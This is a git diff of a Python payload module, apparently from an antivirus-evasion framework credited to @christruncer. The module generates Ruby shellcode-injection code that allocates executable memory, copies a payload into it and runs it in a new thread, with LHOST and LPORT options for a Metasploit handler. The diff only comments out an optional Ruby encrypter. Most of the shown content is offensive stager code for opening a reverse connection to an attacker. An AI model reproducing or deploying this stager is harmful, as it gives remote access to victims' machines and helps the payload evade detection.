@@ -15,7 +15,7 @@ Module by @christruncer
 import struct, string, random, sys, os
 
 from modules.common import helpers
-from modules.common import encryption
+#from modules.common import encryption
 from modules.common import patch
 
 import settings
@@ -33,7 +33,7 @@ class Payload:
         # options we require user interaction for- format is {OPTION : [Value, Description]]}
         self.required_options = {
                                     "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
-                                    "USE_CRYPTER"    : ["N", "Use the Ruby encrypter"],
+                                    #"USE_CRYPTER"    : ["N", "Use the Ruby encrypter"],
                                     "INJECT_METHOD"  : ["virtual", "[virtual]alloc"],
                                     "LHOST"          : ["", "IP of the Metasploit handler"],
                                     "LPORT"          : ["443", "Port of the Metasploit handler"]
@@ -90,7 +90,7 @@ class Payload:
         payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
         payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)
 
-        if self.required_options["USE_CRYPTER"][0].lower() == "y":
-            payloadCode = encryption.rubyCrypter(payloadCode)
+        #if self.required_options["USE_CRYPTER"][0].lower() == "y":
+        #    payloadCode = encryption.rubyCrypter(payloadCode)
 
         return payloadCode
